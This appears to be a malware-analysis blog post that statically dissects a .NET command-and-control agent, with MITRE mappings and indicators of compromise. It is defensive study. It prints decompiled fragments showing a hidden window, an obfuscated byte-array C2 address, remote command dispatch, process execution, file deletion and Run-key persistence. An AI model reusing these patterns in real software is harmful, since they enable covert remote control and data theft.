+++
title = '004 - Analyzing a C2 agent - Part 2: the agent - Static analysis'
date = 2024-01-05T12:03:49-05:00
draft = false
translationKey = '004-dotnet-agent'
description = 'In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it.'
+++


*Este artículo también está disponible en [español](/es/posts/004-analyzing-a-dotnet-c2-agent/)*


## 1. Introduction

In [the first part of this article](/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/) we identified that, after implementing certain techniques to make detection more difficult, the malicious macro we analyzed extracted and executed an embedded .exe binary. In this part, we will analyze said binary statically to understand how it works, how we determine that it corresponds to a C2 agent, and what indicators of compromise we can obtain from it.

Due to the length of the article, we will evaluate the binary dynamically in a third installment.

> **Disclaimer**: Running malware on a personal or corporate device can put your information/your company's information at risk. Never run malware on a device that has not been specifically configured for malware analysis.

## 2. Static analysis of the executable
### 2.1 Identifying the binary's hashes and the development framework it uses

We start the analysis by obtaining the hash of the executable:

| Algorithm | Hash                                                             |
|-----------|------------------------------------------------------------------|
| MD5       | 59211a4e0f27d70c659636746b61945a                                 |
| SHA256    | 2110af4e9c7a4f7a39948cdd696fcd8b 4cdbb7a6a5bf5c5a277b779cc1bf8577 |


After opening the binary in [PEStudio](https://www.winitor.com/download), we see some interesting things:

![alt text](/img/004-pestudio1.png "PEStudio Analysis")

1. PEStudio identifies the binary as of "Microsoft .NET" type.
2. The binary appears to have been compiled on September 05 2023, so it is recent (this value can be altered so it is not 100% reliable).
3. The path to the "debug" file of the binary is identified, which contains \obj\Debug, a standard directory created by Visual Studio.

These factors seem to suggest that it is a .NET program; additionally, by analyzing some of the other sections provided by PEStudio we can get further confirmation of this:

![alt text](/img/004-pestudio2.png "PEStudio Indicators")

![alt text](/img/004-pestudio3.png "PEStudio Imports")

1. PEStudio identifies the .NET namespace System.Net.Socket
2. PEStudio identifies that the program, during its execution, imports [.NET classes](https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0)

With this information, we can say with near total certainty that the binary corresponds to one developed with the .NET framework. Additionally, we see that PEStudio identifies an IP, which may be an indicator of compromise (IOC) of interest.

### Decompilation of .NET binaries

Programs developed in .NET are usually susceptible to decompilation because they are not compiled directly to the binary machine language that the computer understands (the 0's and 1's). Instead, they are compiled to an intermediate language (IL), which is converted during the program's execution to the specific machine language of the environment in which it is running.

Although this framework provides flexibility, the intermediate language contains information about classes names, methods, metadata, etc., which allows it to be decompiled and thus, "reverted" almost to its original form.

There are different tools that allow decompiling a binary created in .NET, among them [_ILSpy_](https://github.com/icsharpcode/ILSpy) and [_dnSpy_](https://github.com/dnSpy/dnSpy); for this analysis I will use _dnSpy_ due to the debugging capabilities it offers.


### 2.2 Initial analysis of the binary

When we open the executable in _dnSpy_, we validate that we can indeed visualize the code:

![alt text](/img/004-dnspy.png "dnSpy")

Since analyzing each function called by the executable can be very tedious (specially if it contains garbage code to hinder analysis), we will follow the flow of calls made from the Main method.

1. We verify that when the program starts it calls the Form1 form, which, when initialized, invokes the **InitializeComponent()** method. From this method's configuration we can gather three things:
    1. The opacity of the form is set to 0 to make it invisible.
    2. The form is configured not to have an icon in the taskbar.
    3. The method **Form1_Load** is called.
    
```c#
private void InitializeComponent()
		{
            ...
			base.Name = "Form1";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			this.Text = "Form1";
			base.FormClosing += this.Form1_FormClosing;
			base.Load += this.Form1_Load;
            ...

		}
```

2. The **Form1_Load** method stops execution ("sleeps") for a few seconds before calling the **corediQart()** method:    

```c#
private void Form1_Load(object sender, EventArgs e)
		{
			try
			{
				Thread.Sleep(1010);
				base.ShowInTaskbar = false;
				base.Visible = false;
				base.FormBorderStyle = FormBorderStyle.SizableToolWindow;
				Thread.Sleep(2050);
				Thread.Sleep(1280);
				this.mainvp.corediQart();
			}
			catch
			{
			}
		}
```

This technique ([T1497.003](https://attack.mitre.org/techniques/T1497/003/)) is usually used by attackers to evade dynamic analysis tools, many of which are only active for a short period of time and may believe that a binary does not have malicious behavior just because it is not yet executed. In this case, from my point of view, the times are too short to be useful for this technique, so they are probably to give time to other components of the program to finish loading.

3. The **corediQart()** method performs the following actions:
    1. Assigns the first port defined in the _ports_ variable to the _port_ variable.
    2. Gets the name of the computer where the program is running, as well as the user running the program and assigns it to the _userAiunt_ variable.
    3. Creates an object of type _TimerCallback_ that calls the **procvQloop** method.
    4. Set the object of type _TimerCallback_ to run every 58.51 seconds, after initially waiting 49.12 seconds.

```c#
		public void corediQart()
		{
			DIRERRIF.port = DIRERRIF.ports[0];
			this.userAiunt = new MRDFINF();
			...
			TimerCallback callback = new TimerCallback(this.procvQloop);
			Timer timer = new Timer(callback, this.objeAdate, 49120, 58510);
			this.objeAdate.timer = timer;
		}
```
```c#
        public static int[] ports = new int[]
		{
			9149,
			15198,
			17818,
			27781,
			29224
		};
```
```c#
        public MRDFINF()
		{
			...
			this.comtname = SystemInformation.ComputerName;
			this.acc_datQtime = Environment.UserName;
			...
		}

```

4. Analyzing what the **procvQloop()** method does, it initiates a TCP connection with the IP stored in the _min\_codns_ variable; in that variable, the IP is stored as a set of bytes, probably to make detection more difficult:

```c#
DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, 0, DIRERRIF.min_codns.Length).ToString();
this.maiedet = new TcpClient();
this.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
```
```c#
public static byte[] min_codns = new byte[]
{49, 54, 50, 46, 50, 52, 53, 46, 49, 57, 49, 46, 50, 49, 55};
```

The TCP connection is established with the IP stored in the _min\_codns_ variable on the port assigned to the _port_ variable.

5. Once the connection is made, if successful, the **procD_core()** method is called, which performs multiple operations:
    1. Gets a response from the previously established TCP connection.
    2. Separate the obtained answer using the '=' separator.
    3. Based on the first value of the answer (what was before the '=') it calls different methods.

```c#
private void procD_core()
        ...
		string[] procss_type = this.get_procsQtype();
		...
		string text = procss_type[0].ToLower();
		...
		if (text == "thyTumb")
		{
			this.imagiQtails(procss_type[1]);
		}
		if (text == "scyTrsz")
		{
			this.dsAscrnsize(procss_type[1]);
		}
		...
```


```c#
public string[] get_procsQtype()
{
	string[] result;
	try
	{
		byte[] array = new byte[5];
		this.byteAdesr = this.newWam.Read(array, 0, 5);
		int num = BitConverter.ToInt32(array, 0);
		byte[] array2 = new byte[num];
		int num2 = 0;
		for (int i = num; i > 0; i -= this.byteAdesr)
		{
			int count = (i > this.bufeAize) ? this.bufeAize : i;
			this.byteAdesr = this.newWam.Read(array2, num2, count);
			num2 += this.byteAdesr;
		}
		string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
		if (text.Trim() == "")
		{
			result = null;
		}
		else
		{
			result = text.Split(new char[]
			{
				'='
			});
		}
	}
	return result;
}
```

Without analyzing the rest of the functions, the behavior of the program already suggests that it might be a C2 agent:
1. Every so often (approximately every minute), it communicates with a server using a non-common IP and a non-common port.
2. It receives a response from the server, which is composed of two sections.
3. Based on the first section (commands), it calls methods by passing them the second section (payload/command parameters).

Based on this analysis we can assume that the server sends commands to the agent, which executes them. Further analysis will allow us to confirm if it is really a Command and Control agent, as well as the capabilities that this agent has.


### 2.3 Analysis of C2 agent functions

Since analyzing each function would be very tedious, we will analyze some functions that I found interesting:

#### 2.3.1 List processes

As in the macro containing the binary, the use of underscores to separate commands/variables is seen: 

![alt text](/img/004-lp1.png "Obfuscation")

When the "geyTtavs" command is received, the processes running on the system are obtained and their ID and name are sent to the server using the **loadQData** function:

![alt text](/img/004-lp2.png "List Processes")

The **loadQData** function sends the type of response to expect, the size of the response and the response to the server.

Just by analyzing the "list processes" function, we can confirm that it is indeed a Command and Control agent: the program contacts a server, receives an instruction (list processes in this case) and sends the response to the server.

#### 2.3.2 Establish persistence

The registry key _HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run_ is usually abused by attackers to establish persistence; such technique is [listed in MITRE ATT&CK with ID T1547.001](https://attack.mitre.org/techniques/T1547/001/) and [allows an attacker to run a program when the user logs in](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys), under the context (permissions) of that user.

We verify that the agent provides the capability to establish persistence. On receiving the command "puyTtsrt" it creates the registry key with name "haijwivetsgVr":

![alt text](/img/004-pers1.png "Establish persistence 1")

![alt text](/img/004-pers2.png "Establish persistence 2")

![alt text](/img/004-pers3.png "Establish persistence 3")

As before, we see that the path name in the registry has been split using underscores to make identification more difficult.

#### 2.3.3 List files

Upon receiving the "flyTes" command along with a path, the command lists the files in the path using the **Directory.GetFiles** method, concatenates them using the character '>' as a separator and sends them to the server:

![alt text](/img/004-listfiles.png "Listing files")

![alt text](/img/004-listfiles2.png "Read directory")


#### 2.3.4 Take screenshots

The "cdyTcrgn", "csyTcrgn" and "csyTdcrgn" commands can be used to take screenshots and send them to the server:

![alt text](/img/004-sc1.png "Screen capture 1")

![alt text](/img/004-sc2.png "Screen capture 2")

![alt text](/img/004-sc3.png "Screen capture 3")


#### 2.3.5 File exfiltration

The "afyTile" command can be used to exfiltrate a file from the victim's machine to the server; to do so, it receives the path of the file to exfiltrate as a parameter:

![alt text](/img/004-exfilb.png "File exfiltration")

![alt text](/img/004-exfila.png "File exfiltration 2")

The information sent back to the server includes the file path, the file name and the contents of the file.


#### 2.3.6 Execute binaries

To execute a program that already exists in the system (either native or downloaded with another command), the "ruyTnf" command is used, which starts a new process receiving as a parameter the name of the program to be executed.

```C#
if (text == "ruyTnf") {
  ...
    Process.Start(procss_type[1].Split(new char[] { '>' })[0]);
  } catch {
  }
}
```

#### 2.3.7 Delete a file

The "deyTlt" command receives as a parameter the path where a file is stored, and then uses the **File.Delete** method to delete it:

```C#
if (text == "deyTlt") {
  this.trasQfiles(procss_type[1]);
}

public void trasQfiles(string path) {
  try {
    File.Delete(path);
  } catch {
  }
}
```

## 3. Conclusions

When I started writing this article I thought it would be the final part of the analysis; however, after identifying the number of functions that the agent exposed, I preferred to go into detail on some of them and leave the dynamic analysis for the next article.

The analyzed malware has all the characteristics of a Command and Control agent: it contacts the server from time to time, allows obtaining information from the system, allows exfiltrating information, allows downloading binaries to the system and executing them, among other functions.

The malware uses a couple of techniques to bypass static code analysis tools: the use of underscores to alter variable names/registry keys, as well as the use of a byte array to store an IP instead of storing it in plaintext; however, the fact that it has been developed in .NET allows for easy decompilation and analysis.

In the next article I will elaborate on how someone can interact with the malware as part of their analysis, and thus evidence whether it has any unidentified behavior not identified as part of the static analysis.

## 4. MITRE ATT&CK Mapping

| ID        | Tactic              | Technique                                                             | Description                                                                 |
|-----------|---------------------|-----------------------------------------------------------------------|-----------------------------------------------------------------------------|
| T1059.003 | Execution           | Command and Scripting Interpreter: Windows Command Shell              | The method Process.Start was used to initiate new processes                 |
| T1547.001 | Persistence         | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | A registry key was used to stablish persistence                             |
| T1070.004 | Defence evasion     | Indicator Removal: File Deletion                                      | The agent has the capability to delete files                                |
| T1027.010 | Defence evasion     | Obfuscated Files or Information: Command Obfuscation                  | Character substitution was used to obfuscate commands                       |
| T1057     | Discovery           | Process Discovery                                                     | The agent has the capability to list processes                              |
| T1082     | Discovery           | System Information Discovery                                          | The agent has the capability to obtain information about the system         |
| T1113     | Collection          | Screen Capture                                                        | The agent has the capability to take screenshots                            |
| T1005     | Collection          | Data from Local System                                                | The agent has the capability to obtain information about the system's files |
| T1571     | Command and Control | Non-Standard Port                                                     | The agent communicates using a non-standard port                            |
| T1095     | Command and Control | Non-Application Layer Protocol                                        | The agent communicates directly through a TCP connection                    |
| T1041     | Command and Control | Exfiltration Over C2 Channel                                          | The agent exfiltrates information using the connection with the C2 server   |

## 5. IOC

| IOC                                                                           | Tipo              | Descripción                                |
|-------------------------------------------------------------------------------|-------------------|--------------------------------------------|
| 59211a4e0f27d70c659 636746b61945a                                              | Hash MD5          | C2 agent hash                              |
| 162.245.191.217                                                               | IP                | IP that the agent calls                    |
| HKEY\CURRENT \USER\Software \Microsoft\Windows \CurrentVersion \Run\haijwivetsgVr | Llave de registro | Registry key used to establish persistence |